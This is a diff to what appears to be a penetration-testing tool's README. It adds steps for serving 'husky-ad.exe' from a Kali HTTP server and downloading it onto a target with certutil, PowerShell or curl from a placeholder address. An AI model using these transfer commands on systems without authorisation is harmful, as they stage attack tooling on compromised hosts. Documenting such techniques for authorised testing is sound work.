@@ -189,6 +189,17 @@ All pre-installed on Kali:
 - Domain-joined machine (or credentials)
 - That's it. No modules.
 
+```
+# From Kali - python HTTP server
+python3 -m http.server 80
+
+# On target - download
+certutil -urlcache -split -f http://YOUR_IP/husky-ad.exe husky-ad.exe
+# or
+powershell -c "iwr http://YOUR_IP/husky-ad.exe -OutFile husky-ad.exe"
+# or
+curl http://YOUR_IP/husky-ad.exe -o husky-ad.exe
+```
 ## Author
 
 **The Husky Hacker**
